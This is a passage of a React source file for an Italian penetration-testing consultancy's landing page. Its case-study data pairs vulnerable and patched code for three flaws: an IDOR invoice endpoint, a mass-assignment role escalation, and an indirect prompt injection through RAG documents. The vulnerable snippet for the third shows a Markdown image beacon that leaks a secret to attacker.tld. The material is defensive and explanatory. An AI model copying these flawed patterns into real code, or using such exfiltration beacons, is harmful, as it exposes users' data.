    label: "01 // STATIC PERIMETER",
    sequence: ["MANUAL", "FIREWALLED", "STATIC", "EVOLVED"],
    subheadline:
      "Ieri bastava chiudere le porte di rete con un firewall. Oggi le minacce hanno superato il perimetro statico e si sono evolute.",
  },
  {
    id: "distributed-surface",
    label: "02 // DISTRIBUTED SURFACE",
    sequence: ["CLOUD", "API-DRIVEN", "DISTRIBUTED", "EVOLVED"],
    subheadline:
      "Il tuo prodotto vive tra API, microservizi e identità cloud: la superficie d'attacco è ovunque e le minacce si sono evolute con essa.",
  },
  {
    id: "autonomous-risk",
    label: "03 // AUTONOMOUS RISK",
    sequence: ["STATIC", "SCRIPTED", "DISTRIBUTED", "AUTONOMOUS", "EVOLVED"],
    subheadline:
      "Il tuo software evolve ogni settimana. Le minacce non colpiscono più solo l'infrastruttura: sfruttano logiche applicative, API, cloud identity e agenti AI.",
  },
];

const DIFF_BANDS: Array<{
  word: string;
  bg: string;
  fg: string;
  badgeBg: string;
  badgeFg: string;
  scene: DitherSceneKind;
  caseTag: string;
  title: string;
  summary: string;
  vulnerableCode: string;
  patchedCode: string;
}> = [
  {
    word: "RETOOL",
    bg: PALETTE.blue,
    fg: PALETTE.bg,
    badgeBg: PALETTE.bg,
    badgeFg: PALETTE.ink,
    scene: "torus",
    caseTag: "CASO 01 // FINTECH API PENETRATION TEST",
    title: "BOLA / IDOR su endpoint di fatturazione multi-tenant.",
    summary: "Lo scanner automatico dava esito 100% pulito perché il token JWT era valido. Modificando l'ID risorsa, qualsiasi utente scaricava le fatture di altri clienti.",
    vulnerableCode: `// VULNERABILE: controlla solo il login, non la proprietà\nGET /api/v2/invoices/:invoiceId\nconst invoice = await db.invoices.findUnique({ where: { id } });\nreturn Response.json(invoice); // ❌ Leak cross-tenant`,
    patchedCode: `// PATCHED: ownership enforcement atomico nella query\nGET /api/v2/invoices/:invoiceId\nconst invoice = await db.invoices.findFirst({\n  where: { id, organizationId: session.orgId }\n}); // ✓ Nessun bypass orizzontale possibile`,
  },
  {
    word: "ADAPT",
    bg: PALETTE.red,
    fg: PALETTE.bg,
    badgeBg: PALETTE.bg,
    badgeFg: PALETTE.ink,
    scene: "star",
    caseTag: "CASO 02 // DEVSECOPS DIFF SECURITY GATE",
    title: "Privilegi admin sbloccati da parametri extra nel payload JSON.",
    summary: "Una singola riga in un endpoint di aggiornamento profilo accettava un campo `role` non filtrato (Mass Assignment). Aggiunto gate automatico prima di ogni merge.",
    vulnerableCode: `// VULNERABILE: spread diretto del body utente\nawait db.user.update({\n  where: { id: session.userId },\n  data: { ...await req.json() }\n}); // ❌ {"role": "ADMIN"} accettato`,
    patchedCode: `// PATCHED: allowlist esplicita + schema Zod rigoroso\nconst { fullName, locale } = ProfileSchema.parse(body);\nawait db.user.update({\n  where: { id: session.userId },\n  data: { fullName, locale }\n}); // ✓ Superficie sigillata in CI`,
  },
  {
    word: "EVOLVE",
    bg: PALETTE.ink,
    fg: PALETTE.bg,
    badgeBg: PALETTE.bg,
    badgeFg: PALETTE.ink,
    scene: "hollowCube",
    caseTag: "CASO 03 // AI & LLM SECURITY HARDENING",
    title: "Indirect Prompt Injection via documenti RAG aziendali.",
    summary: "Un documento caricato nel sistema conteneva istruzioni nascoste che inducevano l'assistente AI a esfiltrare segreti interni tramite link Markdown.",
    vulnerableCode: `// VULNERABILE: contesto non isolato né sanificato\nconst prompt = SYSTEM_INSTRUCTIONS + "\\nDoc:\\n" + pdfText;\nreturn renderMarkdown(await llm.generate(prompt));\n// ❌ ![x](https://attacker.tld?leak=SECRET)`,
    patchedCode: `// PATCHED: separazione trust boundary + egress sanitizer\nconst answer = await llm.generate({ system, untrustedData: pdfText });\nreturn renderSafeText(stripExternalImageBeacons(answer));\n// ✓ Esfiltrazione bloccata a livello strutturale`,
  },
];

/**
 * Confronto interattivo tra scanner automatico e pentest manuale ("Cosa vede lo scanner" vs "Cosa trova il pentest manuale").
 * Conservato esportato ma attualmente non renderizzato in pagina per uso futuro.
 */
export function ScannerVsManualComparison() {
  const [scanMode, setScanMode] = useState<"scanner" | "manual">("manual");

  return (
    <div style={{ maxWidth: "1280px", width: "100%", margin: "0 auto" }}>
      <div style={{ display: "flex", gap: "8px", marginBottom: "16px", flexWrap: "wrap" }}>
        <button
          type="button"
          onClick={() => setScanMode("scanner")}
          style={{
            padding: "10px 16px",
            fontFamily: MONO_FONT,
            fontSize: "12px",
            textTransform: "uppercase",
            background: scanMode === "scanner" ? PALETTE.dim : "transparent",
            color: scanMode === "scanner" ? PALETTE.bg : PALETTE.dim,
            border: `1px solid ${PALETTE.dim}`,
            borderRadius: 0,
            cursor: "pointer",
          }}
        >
          [01] COSA VEDE LO SCANNER AUTOMATICO
        </button>
        <button
          type="button"
          onClick={() => setScanMode("manual")}
          style={{
            padding: "10px 16px",
            fontFamily: MONO_FONT,
            fontSize: "12px",
            textTransform: "uppercase",
            background: scanMode === "manual" ? PALETTE.red : "transparent",
            color: scanMode === "manual" ? "#ffffff" : PALETTE.red,
            border: `1px solid ${PALETTE.red}`,
            borderRadius: 0,
            cursor: "pointer",
          }}
        >
          [02] COSA TROVA IL PENTEST MANUALE (GO DEEPER)
        </button>
      </div>

      <div
        style={{
          display: "grid",
          gridTemplateColumns: "repeat(auto-fit, minmax(260px, 1fr))",
          gap: "1px",
          background: "#262428",
          border: "1px solid #262428",
        }}
      >
        {(scanMode === "scanner"
          ? [
              {
                k: "RUMORE",
                v: "184 Avvisi Bassa Priorità",
                d: "Header mancanti, versioni libreria informative e cookie flag che intasano il backlog senza rischio reale.",
              },
              {
                k: "LOGICA APPLICATIVA",
                v: "0% Copertura",
                d: "Non capisce se l'utente A sta scaricando la fattura dell'utente B cambiando un UUID.",
              },
              {
                k: "DELIVERABLE",
                v: "PDF da 210 Pagine",
                d: "Nessuna prova reale di sfruttamento, decine di falsi positivi e zero codice di remediation.",
              },
            ]
          : [
              {
                k: "PRECISIONE",
                v: "Zero Falsi Positivi",
                d: "Solo vulnerabilità verificate a mano e sfruttabili in un contesto reale contro la tua infrastruttura.",
              },
              {
                k: "BUSINESS LOGIC",
                v: "Exploit Chains Complete",
                d: "Test su BOLA/IDOR, bypass MFA/RBAC, SSRF verso cloud IAM e prompt injection su agenti AI.",
              },
              {
                k: "DELIVERABLE",
                v: "PoC + Patch + Re-Test",
                d: "Passi esatti di riproduzione, fix pronte nel tuo stack e re-test finale per certificare la chiusura.",
              },
            ]
        ).map((cell) => (
          <div key={cell.k} style={{ background: PALETTE.bg, padding: "24px" }}>
            <div
              style={{
                fontSize: "11px",
                letterSpacing: "0.09em",
                color: scanMode === "manual" ? PALETTE.red : PALETTE.dim,
                marginBottom: "8px",
              }}
            >
              {cell.k}
            </div>
            <div
              style={{
                fontFamily: DISPLAY_FONT,
                fontSize: "2rem",
                textTransform: "uppercase",
                color: PALETTE.ink,
                marginBottom: "8px",
              }}
            >
              {cell.v}
            </div>
            <p style={{ margin: 0, fontSize: "13px", lineHeight: 1.55, color: "#9c999b" }}>
              {cell.d}
            </p>
          </div>
        ))}
      </div>
    </div>
  );
}

/* ============================================================================
 * COMPONENTE PRINCIPALE: SITO CYBERSEC IN STILE LARACON AU 26
 * ========================================================================== */
export function LaraconCybersecSite() {
  const [stageIdx, setStageIdx] = useState<0 | 1 | 2>(2);
  const [replayNonce, setReplayNonce] = useState(0);
  const [pointerOffset, setPointerOffset] = useState({ x: 0, y: 0 });
  const [cubeExploded, setCubeExploded] = useState(false);
  const [exploitActive, setExploitActive] = useState(false);
  const pillar0Ref = useRef<HTMLDivElement | null>(null);
  const pillar1Ref = useRef<HTMLDivElement | null>(null);
  const [activeBuyer, setActiveBuyer] = useState<BuyerSegmentKey>("startup");
  const [diffStates, setDiffStates] = useState<Record<number, "vuln" | "patch">>({
    0: "patch",
    1: "patch",
    2: "patch",
  });

  useEffect(() => {
    const checkScrollCards = () => {
      const vh = window.innerHeight;
      const el0 = pillar0Ref.current;
      if (el0) {
        const r0 = el0.getBoundingClientRect();
        const c0 = r0.top + r0.height * 0.5;
        if (c0 <= vh * 0.58 && r0.bottom >= vh * 0.25) {
          setCubeExploded(true);
        } else if (r0.top > vh * 0.48) {
          setCubeExploded(false);
        }
      }

      const el1 = pillar1Ref.current;
      if (el1) {
        const r1 = el1.getBoundingClientRect();
        const c1 = r1.top + r1.height * 0.5;
        if (c1 <= vh * 0.58 && r1.bottom >= vh * 0.25) {
          setExploitActive(true);
        } else if (r1.top > vh * 0.48) {
          setExploitActive(false);
        }
      }
    };

    checkScrollCards();
    window.addEventListener("scroll", checkScrollCards, { passive: true });
    window.addEventListener("resize", checkScrollCards);
    return () => {
      window.removeEventListener("scroll", checkScrollCards);
      window.removeEventListener("resize", checkScrollCards);
    };
  }, []);

  const activeStage = EVOLUTION_STAGES[stageIdx];
  const buyer = BUYER_SEGMENTS[activeBuyer];

  const handleHeroPointerMove = useCallback((e: React.PointerEvent<HTMLElement>) => {
    const r = e.currentTarget.getBoundingClientRect();
    const nx = ((e.clientX - r.left) / r.width - 0.5) * 2;
    const ny = ((e.clientY - r.top) / r.height - 0.5) * 2;
    setPointerOffset({ x: nx, y: ny });
  }, []);

  const handleHeroPointerLeave = useCallback(() => {
    setPointerOffset({ x: 0, y: 0 });
  }, []);

  const eraSubScenes = useMemo(
    () => [
      { id: "skyline" as const, label: "01 // SUPERFICIE D'ATTACCO ESPANSA [CHANGED]", color: PALETTE.red },
      { id: "wave" as const, label: "02 // ONDATA DI ATTACCHI AUTOMATICI", color: PALETTE.blue },
      { id: "stairs" as const, label: "03 // MATURITÀ DIFENSIVA: DAL TOOL ALL'UOMO", color: PALETTE.ink },
    ],
    []
  );

  return (
    <div
      style={{
        background: PALETTE.bg,
        color: PALETTE.ink,
        fontFamily: MONO_FONT,
        overflowX: "clip",
      }}
    >
      {/* =====================================================================
       * SCHERMATA 1 — HERO ("THE THREATS HAVE" + "EVOLVED" come evento)
       * =================================================================== */}
      <section
        aria-label="Hero: Evoluzione della minaccia"
        onPointerMove={handleHeroPointerMove}
        onPointerLeave={handleHeroPointerLeave}
        style={{
          minHeight: "92vh",
          borderBottom: `1px solid ${PALETTE.slate}`,
          display: "grid",
          gridTemplateRows: "1fr",
          padding: "clamp(20px, 4vw, 48px)",
          gap: "24px",
        }}
      >
        {/* Hero Stage: Tipografia monumentale allineata a sinistra */}
        <div
          style={{
            display: "flex",
            flexDirection: "column",
            justifyContent: "center",
            alignItems: "flex-start",
            textAlign: "left",
            gap: "28px",
            maxWidth: "1280px",
            width: "100%",
            margin: "0 auto",
          }}
        >
          <HeroEvolveTitle
            replayKey={replayNonce}
            onReplay={() => setReplayNonce((n) => n + 1)}
          />

          <div
            style={{
              display: "flex",
              flexWrap: "wrap",
              justifyContent: "flex-start",
              gap: "12px",
              marginTop: "4px",
            }}
          >
            <Link
              href="/prenota"
              style={{
                padding: "14px 24px",
                background: PALETTE.red,
                color: "#ffffff",
                fontFamily: DISPLAY_FONT,
                fontSize: "1.25rem",
                letterSpacing: "0.02em",
                textTransform: "uppercase",
                textDecoration: "none",
                borderRadius: 0,
              }}
            >
              DISCUTIAMO IL TUO PERIMETRO →
            </Link>
            <a
              href="#go-deeper"
              style={{
                padding: "14px 20px",
                background: "transparent",
                color: PALETTE.ink,
                border: `1px solid ${PALETTE.ink}`,
                fontFamily: MONO_FONT,
                fontSize: "12px",
                textTransform: "uppercase",
                textDecoration: "none",
                borderRadius: 0,
                display: "inline-flex",
                alignItems: "center",
              }}
            >
              ESPLORA IL METODO ↓
            </a>
          </div>
        </div>
      </section>

      {/* =====================================================================
       * SCHERMATA 2 — LO SPARTIACQUE ("IN 2026 WE| -> GO DEEPER")
       * =================================================================== */}
      <section
        id="go-deeper"
        aria-label="Go Deeper: Scanner automatico vs Pentest manuale"
        style={{
          minHeight: "88vh",
          borderBottom: `1px solid ${PALETTE.slate}`,
          padding: "clamp(48px, 7vw, 96px) clamp(20px, 4vw, 48px)",
          display: "flex",
          flexDirection: "column",
          justifyContent: "center",
          gap: "40px",
        }}
      >
        <div
          style={{
            maxWidth: "1280px",
            width: "100%",
            margin: "0 auto",
            position: "relative",
            border: "1px solid #1f1d21",
            background: "#020206",
            padding: "clamp(28px, 5vw, 64px) clamp(20px, 4vw, 48px)",
            overflow: "hidden",
          }}
        >
          {/* Tunnel prospettico 3D pixel-locked di sfondo */}
          <div
            aria-hidden="true"
            style={{
              position: "absolute",
              inset: 0,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              opacity: 0.72,
            }}
          >
            <PixelDitherCanvas
              kind="tunnel"
              color={PALETTE.blue}
              width={720}
              height={420}
              cellSize={6}
              style={{ width: "100%", height: "100%", objectFit: "cover" }}
            />
          </div>

          <div style={{ position: "relative", zIndex: 2, textAlign: "center" }}>
            <div style={{ fontSize: "13px", letterSpacing: "0.14em", marginBottom: "14px", color: PALETTE.ink }}>
              <TypewriterBar text="IN 2026 WE" cursorColor={PALETTE.red} speedMs={75} />
            </div>
            <h2
              style={{
                margin: 0,
                fontFamily: DISPLAY_FONT,
                fontWeight: 700,
                fontSize: "clamp(4rem, 12vw, 9.5rem)",
                lineHeight: 0.85,
                letterSpacing: "-0.03em",
                textTransform: "uppercase",
                color: PALETTE.ink,
              }}
            >
              GO DEEPER
            </h2>
            <p
              style={{
                margin: "20px auto 0 auto",
                maxWidth: "56ch",
                fontSize: "13px",
                lineHeight: 1.6,
                color: PALETTE.ink,
                background: "rgba(1, 1, 1, 0.82)",
                padding: "10px 14px",
                border: "1px solid #262428",
              }}
            >
              Uno scanner automatico vede solo i mattoni esterni. Un penetration test manuale attraversa
              il flusso di autenticazione, le race condition e i controlli di ruolo reali.
            </p>
          </div>
        </div>
      </section>

      {/* =====================================================================
       * SCHERMATA 3 — LA TRILOGIA DEL METODO ([DE]CONSTRUCT / [EX]PLOIT / [RE]MEDIATE)
       * Card grandi in sticky stacking che si sovrappongono allo scroll
       * =================================================================== */}
      <section
        aria-label="Trilogia del metodo offensivo e difensivo"
        style={{
          borderBottom: `1px solid ${PALETTE.slate}`,
          padding: "clamp(64px, 9vw, 120px) clamp(20px, 4vw, 48px)",
        }}
      >
        <div
          style={{
            maxWidth: "1280px",
            width: "100%",
            margin: "0 auto",
            display: "flex",
            flexDirection: "column",
            gap: "22vh",
            paddingBottom: "10vh",
          }}
        >
          {RE_PILLARS.map((item, idx) => (
            <div
              key={item.verb}
              ref={idx === 0 ? pillar0Ref : idx === 1 ? pillar1Ref : undefined}
              style={{
                position: "sticky",
                top: `${72 + idx * 24}px`,
                zIndex: idx + 1,
                minHeight: "min(74vh, 580px)",
                background: "#050507",
                border: "1px solid #262428",
                borderTop: `3px solid ${item.color}`,
                boxShadow: idx > 0 ? "0 -28px 60px rgba(0, 0, 0, 0.9)" : "none",
                padding: "clamp(32px, 5vw, 64px)",
                display: "grid",
                gridTemplateColumns: "repeat(auto-fit, minmax(260px, 1fr))",
                alignItems: "center",
                gap: "32px",
              }}
            >
              {/* Colonna SX: [PREFISSO] + VERBO gigante */}
              <div>
                <div
                  style={{
                    fontSize: "12px",
                    color: PALETTE.dim,
                    marginBottom: "14px",
                    letterSpacing: "0.12em",
                  }}
                >
                  FASE 0{idx + 1}
                </div>
                <div style={{ display: "inline-flex", alignItems: "center", gap: "0.14em" }}>
                  <PixelDissolveBadge
                    text={item.prefix}
                    bg={item.color}
                    fg={PALETTE.bg}
                    fontSize="clamp(3.6rem, 7.2vw, 6.4rem)"
                    padding="0.06em 0.18em"
                  />
                  <span
                    style={{
                      fontFamily: DISPLAY_FONT,
                      fontWeight: 700,
                      fontSize: "clamp(3.6rem, 7.2vw, 6.4rem)",
                      lineHeight: 0.92,
                      letterSpacing: "-0.02em",
                      color: PALETTE.ink,
                      textTransform: "uppercase",
                    }}
                  >
                    {item.verb}
                  </span>
                </div>
              </div>

              {/* Colonna DX: Solido 3D */}
              <div style={{ display: "flex", justifyContent: "center" }}>
                <PixelDitherCanvas
                  kind={item.scene}
                  color={item.color}
                  width={380}
                  height={270}
                  cellSize={5}
                  explode={idx === 0 && cubeExploded ? 1 : idx === 1 && exploitActive ? 1 : 0}
                  style={{ width: "100%", maxWidth: "380px", height: "auto" }}
                />
              </div>
            </div>
          ))}
        </div>
      </section>

      {/* =====================================================================
       * SCHERMATA 4 — TARGET D'ACQUISTO ([REAL] SYSTEMS — PMI, Startup, Multi)
       * =================================================================== */}
      <section
        aria-label="Selettore per chi compra: PMI, Startup e Multinazionali"
        style={{
          position: "relative",
          minHeight: "90vh",
          borderBottom: `1px solid ${PALETTE.slate}`,
          padding: "clamp(48px, 7vw, 96px) clamp(20px, 4vw, 48px)",
          overflow: "hidden",
        }}
      >
        {/* Cupola antracite in dither sullo sfondo come 0:44–0:47 */}
        <div
          aria-hidden="true"
          style={{
            position: "absolute",
            left: "50%",
            bottom: 0,
            transform: "translateX(-50%)",
            width: "min(900px, 100%)",
            pointerEvents: "none",
            opacity: 0.9,
          }}
        >
          <PixelDitherCanvas kind="dome" color={PALETTE.slate} width={760} height={360} cellSize={6} interactive={false} style={{ width: "100%", height: "auto" }} />
        </div>

        <div style={{ position: "relative", zIndex: 2, maxWidth: "1280px", margin: "0 auto", display: "flex", flexDirection: "column", gap: "28px" }}>
          <div style={{ textAlign: "center" }}>
            <div style={{ fontSize: "11px", color: PALETTE.dim, letterSpacing: "0.14em", marginBottom: "14px" }}>
              CHI COMPRA CYBERSECURITY · SELEZIONA IL TUO CONTESTO
            </div>
            <h2
              style={{
                margin: 0,
                display: "inline-flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "0.18em",
                flexWrap: "wrap",
                fontFamily: DISPLAY_FONT,
                fontSize: "clamp(2.8rem, 6vw, 5.2rem)",
                lineHeight: 0.9,
                letterSpacing: "-0.02em",
                textTransform: "uppercase",
              }}
            >
              <PixelDissolveBadge
                text="REAL"
                bg={PALETTE.ink}
                fg={PALETTE.bg}
                triggerKey={activeBuyer}
                fontSize="clamp(2.8rem, 6vw, 5.2rem)"
              />
              <PixelDissolveBadge
                text={buyer.badgeWord}
                bg="transparent"
                fg={buyer.badgeColor}
                triggerKey={activeBuyer}
                fontSize="clamp(2.8rem, 6vw, 5.2rem)"
                padding="0"
              />
            </h2>
          </div>

          {/* 3 Tab di Target d'Acquisto */}
          <div
            style={{
              display: "grid",
              gridTemplateColumns: "repeat(auto-fit, minmax(220px, 1fr))",
              gap: "8px",
            }}
          >
            {(Object.keys(BUYER_SEGMENTS) as BuyerSegmentKey[]).map((key) => {
              const seg = BUYER_SEGMENTS[key];
              const isSelected = activeBuyer === key;
              return (
                <button
                  key={key}
                  type="button"
                  onClick={() => setActiveBuyer(key)}
                  style={{
                    padding: "16px",
                    textAlign: "left",
                    background: isSelected ? seg.badgeColor : "#08080a",
                    color: isSelected ? (seg.badgeColor === PALETTE.ink ? PALETTE.bg : "#ffffff") : PALETTE.ink,
                    border: `1px solid ${isSelected ? seg.badgeColor : "#2b292e"}`,
                    borderRadius: 0,
                    cursor: "pointer",
                    fontFamily: MONO_FONT,
                  }}
                >
                  <div style={{ fontSize: "11px", opacity: 0.85, marginBottom: "6px" }}>{seg.code}</div>
                  <div style={{ fontFamily: DISPLAY_FONT, fontSize: "1.45rem", textTransform: "uppercase", lineHeight: 1.05 }}>
                    {seg.label}
                  </div>
                </button>
              );
            })}
          </div>

          {/* Dettaglio di Conversione per il Target Scelto */}
          <div
            style={{
              border: `1px solid ${buyer.badgeColor}`,
              background: "rgba(1, 1, 1, 0.92)",
              padding: "clamp(20px, 4vw, 36px)",
              display: "grid",
              gap: "24px",
            }}
          >
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "baseline", flexWrap: "wrap", gap: "12px", borderBottom: "1px solid #262428", paddingBottom: "16px" }}>
              <h3 style={{ margin: 0, fontFamily: DISPLAY_FONT, fontSize: "clamp(1.8rem, 3.4vw, 2.8rem)", textTransform: "uppercase", color: PALETTE.ink }}>
                {buyer.headline}
              </h3>
              <span style={{ fontSize: "11px", color: buyer.badgeColor, letterSpacing: "0.06em" }}>
                {buyer.sla}
              </span>
            </div>

            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(230px, 1fr))", gap: "20px" }}>
              <div>
                <div style={{ fontSize: "11px", color: PALETTE.dim, marginBottom: "6px" }}>[01 // COSA TI BLOCCA OGGI]</div>
                <p style={{ margin: 0, fontSize: "13px", lineHeight: 1.6, color: PALETTE.ink }}>{buyer.pain}</p>
              </div>
              <div>
                <div style={{ fontSize: "11px", color: PALETTE.dim, marginBottom: "6px" }}>[02 // PERCHÉ I CLIENTI COMPRANO]</div>
                <p style={{ margin: 0, fontSize: "13px", lineHeight: 1.6, color: PALETTE.ink }}>{buyer.trigger}</p>
              </div>
              <div>
                <div style={{ fontSize: "11px", color: PALETTE.dim, marginBottom: "6px" }}>[03 // VETTORE REALE TESTATO]</div>
                <p style={{ margin: 0, fontSize: "13px", lineHeight: 1.6, color: PALETTE.ink }}>{buyer.vector}</p>
              </div>
              <div>
                <div style={{ fontSize: "11px", color: PALETTE.dim, marginBottom: "6px" }}>[04 // COSA RICEVI IN MANO]</div>
                <p style={{ margin: 0, fontSize: "13px", lineHeight: 1.6, color: PALETTE.ink }}>{buyer.deliverable}</p>
              </div>
            </div>

            <div style={{ display: "flex", flexWrap: "wrap", gap: "8px", paddingTop: "8px" }}>
              {buyer.pillars.map((pill) => (
                <span
                  key={pill}
                  style={{
                    padding: "6px 10px",
                    border: "1px solid #38353b",
                    fontSize: "11px",
                    color: PALETTE.ink,
                    textTransform: "uppercase",
                  }}
                >
                  {pill}
                </span>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* =====================================================================
       * SCHERMATA 5 — MANIFESTI WIDESCREEN & DIFF REMEDIATION ([RETOOL]/[ADAPT]/[EVOLVE])
       * =================================================================== */}
      <section aria-label="Casi studio widescreen e Diff Vulnerabile vs Patchato">
        {DIFF_BANDS.map((band, idx) => {
          const mode = diffStates[idx] ?? "patch";
          return (
            <div
              key={band.word}
              style={{
                background: band.bg,
                color: band.fg,
                borderBottom: `2px solid ${PALETTE.bg}`,
                padding: "clamp(36px, 6vw, 72px) clamp(20px, 4vw, 48px)",
              }}
            >
              <div
                style={{
                  maxWidth: "1280px",
                  margin: "0 auto",
                  display: "grid",
                  gridTemplateColumns: "repeat(auto-fit, minmax(300px, 1fr))",
                  alignItems: "center",
                  gap: "32px",
                }}
              >
                {/* Parte SX: Solido 3D nero dithered con badge sovrapposto come 1:22–1:28 */}
                <div
                  style={{
                    position: "relative",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    minHeight: "260px",
                  }}
                >
                  <PixelDitherCanvas
                    kind={band.scene}
                    color={PALETTE.bg}
                    width={420}
                    height={280}
                    cellSize={5}
                    style={{ width: "100%", maxWidth: "420px", height: "auto" }}
                  />
                  <div style={{ position: "absolute", left: "10%", top: "50%", transform: "translateY(-50%)" }}>
                    <PixelDissolveBadge
                      text={band.word}
                      bg={band.badgeBg}
                      fg={band.badgeFg}
                      fontSize="clamp(2.4rem, 5vw, 4.2rem)"
                      padding="0.1em 0.28em"
                    />
                  </div>
                </div>

                {/* Parte DX: Caso Studio Reale + Ispettore Codice Vulnerabile/Patchato */}
                <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
                  <div style={{ fontSize: "11px", fontWeight: 700, letterSpacing: "0.08em" }}>
                    {band.caseTag}
                  </div>
                  <h3
                    style={{
                      margin: 0,
                      fontFamily: DISPLAY_FONT,
                      fontSize: "clamp(1.8rem, 3.2vw, 2.6rem)",
                      lineHeight: 0.96,
                      textTransform: "uppercase",
                    }}
                  >
                    {band.title}
                  </h3>
                  <p style={{ margin: 0, fontSize: "13px", lineHeight: 1.55, opacity: 0.92 }}>
                    {band.summary}
                  </p>

                  {/* Switch Vulnerabile vs Patchato */}
                  <div style={{ display: "flex", gap: "8px", marginTop: "4px" }}>
                    <button
                      type="button"
                      onClick={() => setDiffStates((s) => ({ ...s, [idx]: "vuln" }))}
                      style={{
                        padding: "7px 12px",
                        fontSize: "11px",
                        fontFamily: MONO_FONT,
                        fontWeight: 700,
                        background: mode === "vuln" ? PALETTE.bg : "transparent",
                        color: mode === "vuln" ? PALETTE.red : PALETTE.bg,
                        border: `1.5px solid ${PALETTE.bg}`,
                        borderRadius: 0,
                        cursor: "pointer",
                      }}
                    >
                      [!] CODICE VULNERABILE
                    </button>
                    <button
                      type="button"
                      onClick={() => setDiffStates((s) => ({ ...s, [idx]: "patch" }))}
                      style={{
                        padding: "7px 12px",
                        fontSize: "11px",
                        fontFamily: MONO_FONT,
                        fontWeight: 700,
                        background: mode === "patch" ? PALETTE.bg : "transparent",
                        color: mode === "patch" ? PALETTE.ink : PALETTE.bg,
                        border: `1.5px solid ${PALETTE.bg}`,
                        borderRadius: 0,
                        cursor: "pointer",
                      }}
                    >
                      [✓] FIX / REMEDIATION PRONTA
                    </button>
                  </div>

                  <pre
                    style={{
                      margin: 0,
                      padding: "16px",
                      background: PALETTE.bg,
                      color: mode === "vuln" ? "#ff7a98" : "#d9d8dc",
                      border: `1px solid ${PALETTE.bg}`,
                      fontFamily: MONO_FONT,
                      fontSize: "12px",
                      lineHeight: 1.5,
                      overflowX: "auto",
                      borderRadius: 0,
                    }}
                  >
                    <code>{mode === "vuln" ? band.vulnerableCode : band.patchedCode}</code>
                  </pre>
                </div>
              </div>
            </div>
          );
        })}
      </section>

      {/* =====================================================================
       * SCHERMATA 6 — FINALE AD ALTO CONTRASTO ("Welcome to the -> SEC.OLUTION")
       * =================================================================== */}
      <section
        aria-label="Finale e Prenotazione Scoping sotto NDA"
        style={{
          background: PALETTE.ink,
          color: PALETTE.bg,
          position: "relative",
          minHeight: "86vh",
          display: "flex",
          flexDirection: "column",
          justifyContent: "space-between",
          padding: "clamp(48px, 7vw, 88px) clamp(20px, 4vw, 48px) 0 clamp(20px, 4vw, 48px)",
          overflow: "hidden",
        }}
      >
        <div
          style={{
            position: "relative",
            zIndex: 2,
            maxWidth: "1120px",
            width: "100%",
            margin: "0 auto",
            textAlign: "center",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            gap: "20px",
          }}
        >
          <span style={{ fontSize: "13px", letterSpacing: "0.08em", color: PALETTE.bg }}>
            Welcome to the
          </span>

          <h2
            style={{
              margin: 0,
              fontFamily: DISPLAY_FONT,
              fontWeight: 700,
              fontSize: "clamp(3.6rem, 11vw, 8.8rem)",
              lineHeight: 0.86,
              letterSpacing: "-0.03em",
              textTransform: "uppercase",
              color: PALETTE.bg,
            }}
          >
            SEC.OLUTION
          </h2>

          <div
            style={{
              display: "inline-flex",
              alignItems: "center",
              gap: "12px",
              flexWrap: "wrap",
              justifyContent: "center",
              marginTop: "6px",
            }}
          >
            <TypewriterBar
              text="MATTEODILIBERTO.IT"
              cursorColor={PALETTE.red}
              speedMs={50}
              style={{
                fontFamily: DISPLAY_FONT,
                fontWeight: 700,
                fontSize: "clamp(1.8rem, 4.5vw, 3.2rem)",
                letterSpacing: "-0.02em",
                color: PALETTE.bg,
              }}
            />
            <span
              style={{
                background: PALETTE.red,
                color: "#ffffff",
                fontFamily: DISPLAY_FONT,
                fontWeight: 700,
                fontSize: "clamp(1.6rem, 3.8vw, 2.8rem)",
                padding: "0.06em 0.24em",
                lineHeight: 0.95,
              }}
            >
              26
            </span>
          </div>

          <p
            style={{
              margin: "12px auto 0 auto",
              maxWidth: "54ch",
              fontSize: "13px",
              lineHeight: 1.6,
              color: "#262428",
            }}
          >
            Trenta minuti su Google Meet protetti da NDA per mappare il perimetro, definire le regole
            d&apos;ingaggio e capire esattamente cosa mettere al sicuro prima del prossimo rilascio.
          </p>

          <div style={{ display: "flex", flexWrap: "wrap", gap: "12px", justifyContent: "center", marginTop: "8px" }}>
            <Link
              href="/prenota"
              style={{
                padding: "16px 28px",
                background: PALETTE.bg,
                color: PALETTE.ink,
                fontFamily: DISPLAY_FONT,
                fontSize: "1.35rem",
                letterSpacing: "0.02em",
                textTransform: "uppercase",
                textDecoration: "none",
                borderRadius: 0,
              }}
            >
              PRENOTA SESSIONE TECNICA (30 MIN) →
            </Link>
            <a
              href={PHONE_NUMBER}
              style={{
                padding: "16px 24px",
                background: "transparent",
                color: PALETTE.bg,
                border: `2px solid ${PALETTE.bg}`,
                fontFamily: MONO_FONT,
                fontSize: "12px",
                fontWeight: 700,
                textTransform: "uppercase",
                textDecoration: "none",
                borderRadius: 0,
                display: "inline-flex",
                alignItems: "center",
              }}
            >
              CONTATTO DIRETTO
            </a>
          </div>
        </div>

        {/* Sole / Semisfera rossa dithered che sorge dal basso come 1:31–1:33 */}
        <div
          style={{
            position: "relative",
            zIndex: 1,
            width: "min(640px, 100%)",
            margin: "24px auto 0 auto",
            pointerEvents: "none",
          }}
        >
          <PixelDitherCanvas
            kind="sunDome"
            color={PALETTE.red}
            width={640}
            height={220}
            cellSize={6}
            interactive={false}
            style={{ width: "100%", height: "auto" }}
          />
        </div>
      </section>
    </div>
  );
}

